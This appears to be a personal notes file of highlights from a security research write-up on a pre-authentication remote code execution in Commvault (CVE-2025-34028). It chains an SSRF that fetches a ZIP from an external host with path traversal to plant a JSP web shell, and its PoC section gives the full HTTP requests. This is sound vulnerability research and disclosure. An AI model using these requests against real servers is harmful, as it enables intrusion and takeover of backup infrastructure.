---
author: Sonny
aliases:
  - Fire in the Hole
  - We’re Breaching the Vault - Commvault Remote Code Execution
tags:
  - readwise/articles
url: https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/?__readwiseLocation=
created: 2025-04-26
---
# Fire in the Hole, We’re Breaching the Vault - Commvault Remote Code Execution

![rw-book-cover](https://labs.watchtowr.com/content/images/2025/04/Group-8730--6-.png)


Whenever reverse engineering applications for vulnerabilities, it's a process; it's going through the grooves to find its routes and endpoints, and asking yourself the all-important question - how can you interact with the application?

## Enumerating Tomcat setup

This varies from Nginx, Apache, Node, etc, but in this example, the initial contact is with an Apache #Tomcat process, whose configuration lies within its `server.xml`.
Looking at the `server.xml` excerpt below, we can correlate the Tomcat application `Context paths` to their `docBase`, which tells us where the relevant files are for each route on disk. [](https://read.readwise.io/read/01jsq73cta35szgrqnk9dv7mkb)

```xml
Context path="" docBase="F:/Program Files/Commvault/ContentStore/Apache/webapps/ROOT" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/console" docBase="F:/Program Files/Commvault/ContentStore/GUI" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/downloads/sqlscripts" docBase="F:/Program Files/Commvault/ContentStore/Metrics/scripts" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/publicdownloads/sqlscripts" docBase="F:/Program Files/Commvault/ContentStore/Metrics/public" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/commandcenter" docBase="F:/Program Files/Commvault/ContentStore/AdminConsole" reloadable="false">
          <Manager pathname=""/>
          <Resource name="BeanManager" auth="Container" type="javax.enterprise.inject.spi.BeanManager" factory="org.jboss.weld.resources.ManagerObjectFactory"/>
        </Context>
        <Context path="/identity" docBase="F:/Program Files/Commvault/ContentStore/identity" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/CustomReportsEngine" docBase="F:/Program Files/Commvault/ContentStore/CustomReportsEngine" reloadable="false">
          <Manager pathname=""/>
        </Context>
        <Context path="/reports" docBase="F:/Program Files/Commvault/ContentStore/Reports" reloadable="false">
          <Manager pathname=""/>
        </Context>
      </Host> 
    </Engine> 
```

the main application resides within `/commandcenter`, which follows a typical Tomcat structure with a `web.xml` and `WEB-INF` directories etc. [](https://read.readwise.io/read/01jsq74jpzsd9jqgm2p0tbkxsg)

Browsing whilst *unauthenticated* with our favourite HTTP proxy, we see several requests to endpoints using the `.do` extension, which typically indicates the usage of Apache #Struts Framework - but this doesn’t appear to be true in the instance of Commvault, as there is no `struts.xml` which lays out all of the `.do` or `.action` endpoints. [](https://read.readwise.io/read/01jsq75ecwp4820efcy8ngzxjk)

When looking at the `web.xml` there are also no exact mapping of `.do` endpoints, there is a `context-param` for `scanPackage` which looks at certain class paths. [](https://read.readwise.io/read/01jsq7662pjmz6sqjcfscfcqf9)

Sometimes, during reverse engineering, going from source to sink can be cumbersome, so to speed up the process, we can work backwards by decompiling all of the `.jar` and `.class` files within the `lib` directory, and looking for endpoints that we `.do` know of. [](https://read.readwise.io/read/01jsq7786whqxck17nkynhy2re)

After successfully decompiling all the libraries, we can grep through them for a path we've already observed (`sloCallBack.do`) within our HTTP proxy. Once we come across an example, it begins to make sense as to how the routing is instantiated [](https://read.readwise.io/read/01jsq7899hde594g2nyg6hvbgz)

...

## Zipping Subterfuge

To summarise, before we complete the heist:
1. We send an HTTP request to `/commandcenter/deployWebpackage.do`
2. This coerces the Commvault instance to fetch a ZIP file from our externally controlled server.
3. The contents of this zip file is unzipped to a `.tmp` directory we control.

A theoretical path to victory here would be to:
- Create a zip file containing a malicious `.jsp` file
- Host this zip file on an external HTTP server via the endpoint `/commandcenter/webpackage.do` `[0]`
- Use the `servicePack` parameter to traverse the `.tmp` directory into a pre-authenticated facing directory on the server, such as `../../Reports/MetricsUpload/shell`. We can ascertain this by referring back to the `server.xml` excerpt at the start of this article.
```xml
<Context path="/reports" docBase="F:/Program Files/Commvault/ContentStore/Reports" reloadable="false">
<Manager pathname=""/>
</Context>
```
- Execute the [Server Side Request Forgery (SSRF)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Server%20Side%20Request%20Forgery%20(SSRF).md) via `/commandcenter/deployWebpackage.do` and see if our shell unzips.
- Execute our shell from `/reports/MetricsUpload/shell/.tmp/dist-cc/dist-cc/shell.jsp` [](https://read.readwise.io/read/01jsq7n272rchfm0dk0yvc7xsy)


## PoC
Full Request: [](https://read.readwise.io/read/01jsq7n77cdb9eek7smmj4zvmm)
```http
POST /commandcenter/deployWebpackage.do HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
commcellName=external-host.com&servicePack=../../Reports/MetricsUpload/shell/&version=watchTowr
```

Now, it's just a case of triggering our shell... [](https://read.readwise.io/read/01jsq7nv4cxesrfzwnk5ntc3r4)
```HTTP
GET /reports/MetricsUpload/shell/.tmp/dist-cc/dist-cc/watchTowr.jsp HTTP/1.1
Host: {{Hostname}} 
```

